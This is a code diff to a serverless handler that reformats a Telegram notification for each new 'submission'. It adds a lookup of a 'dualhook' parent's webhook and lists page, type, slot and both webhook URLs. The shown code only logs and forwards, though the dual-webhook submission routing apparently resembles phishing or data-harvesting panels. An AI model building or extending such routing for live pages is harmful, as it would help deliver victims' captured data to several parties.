@@ -112,23 +112,43 @@ export default async function handler(req, res) {
   }
 
   // ── Step 3: Telegram master log ───────────────────────────────────────────
-  const slotLines = Object.entries(slots)
-    .map(([k, v]) => `  Slot ${k.replace('slot', '')}: ${v || '(empty)'}`)
-    .join('\n');
+  // Resolve webhook1 from parent record if dualhook child
+  let webhook1 = 'N/A';
+  if (record.dualhookParent) {
+    try {
+      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
+      if (parentRecord && parentRecord.webhook) webhook1 = parentRecord.webhook;
+    } catch (_) {}
+  }
+
+  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
+  const slotLabel = slotEntry ? slotEntry[0] : Object.keys(slots)[0];
 
   const tgMsg = [
-    `📥 <b>New Submission!</b>`,
-    `📁 Page: <code>${slug}</code> (${record.displayName})`,
-    `🔧 Type: ${record.type}`,
-    record.dualhookParent ? `🔗 DH Parent: <code>${record.dualhookParent}</code>` : '',
-    ``,
-    `<b>Slots:</b>`,
-    slotLines,
-    ``,
-    `📡 Page webhook (webhook2): <code>${record.webhook}</code>`,
-    record.dualhookParent ? `📡 Creator webhook (webhook1): forwarded via parent` : '',
-    `🕐 ${now}`
-  ].filter(s => s !== undefined && s !== '').join('\n');
+    `🚨 <b>NEW SUBMISSION RECEIVED</b> 🚨`,
+    `------------------------------------------`,
+    `📄 PAGE:`,
+    `${record.displayName}`,
+    `------------------------------------------`,
+    `🗂️ TYPE:`,
+    `${record.type}`,
+    `------------------------------------------`,
+    `👤 DH PARENT:`,
+    `${record.dualhookParent || 'N/A'}`,
+    `------------------------------------------`,
+    `🎯 SLOT:`,
+    `${slotLabel}`,
+    `------------------------------------------`,
+    `🔗 PAGE WEBHOOK (WEBHOOK2):`,
+    `<code>${record.webhook}</code>`,
+    `------------------------------------------`,
+    `🔗 WEBHOOK1:`,
+    `<code>${webhook1}</code>`,
+    `------------------------------------------`,
+    `📅 DATE SUBMITTED:`,
+    `${now}`,
+    `------------------------------------------`
+  ].join('\n');
 
   await tgSend(tgMsg);
 
